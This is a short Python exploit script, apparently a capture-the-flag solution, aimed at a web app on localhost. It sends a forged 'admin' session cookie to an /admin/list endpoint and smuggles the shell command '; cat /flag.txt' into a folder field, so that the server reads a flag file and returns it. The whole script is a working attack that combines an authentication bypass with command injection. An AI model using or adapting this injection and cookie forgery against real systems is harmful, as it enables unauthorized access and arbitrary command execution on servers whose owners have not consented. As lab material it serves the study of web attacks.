import requests

url = "http://localhost:3000"

req = requests.post(url + "/admin/list", cookies={"session": "admin"}, json={"folder": {"raw": "; cat /flag.txt 2>/dev/null"}})
out = ""

if "files" in req.json():
    out += "\n".join(req.json()["files"])
if "error" in req.json():
    out += req.json()["error"]

print(out)